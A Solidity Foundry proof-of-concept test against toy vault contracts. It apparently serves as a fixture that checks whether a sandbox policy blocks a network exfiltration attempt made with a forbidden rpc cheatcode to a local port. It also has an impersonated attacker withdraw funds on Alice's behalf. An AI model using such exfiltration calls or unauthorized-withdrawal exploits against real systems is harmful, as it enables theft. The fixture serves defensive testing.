// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import {HyblisBase} from "./HyblisBase.sol";
import {Token, VaultImpl, Existing, TxGuardVault, Feed, Lender} from "../../src/Toy.sol";

contract HyblisPoC is HyblisBase {
    uint256 constant FORK_BLOCK = 40;
    VaultImpl constant VAULT = VaultImpl(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0);
    Token constant TOKEN = Token(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    TxGuardVault constant GUARD = TxGuardVault(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707);
    Feed constant FEED = Feed(0x0165878A594ca255338adfa4d48449f69242Eb8F);
    Lender constant LENDER = Lender(0xa513E6E4b8f2a923D98304ec87F64353C4D5C853);
    address constant ALICE = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    address constant CAROL = 0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65;
    address constant KEEPER = 0x90F79bf6EB2c4f870365E785982E1f101E93b906;
    address constant OWNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("HYBLIS_ETH_RPC"), FORK_BLOCK);
        attacker = makeAddr("attacker");
    }
    // Exfiltration attempt over the network (and a forbidden cheatcode): blocked by the network
    // namespace on the runner, rejected by the policy everywhere.
    function test_exploit() public {
        try vm.rpc("http://127.0.0.1:9866", "eth_blockNumber", "[]") returns (bytes memory) {} catch {}
        vm.prank(attacker);
        VAULT.withdrawFor(ALICE, 50e18);
    }
}
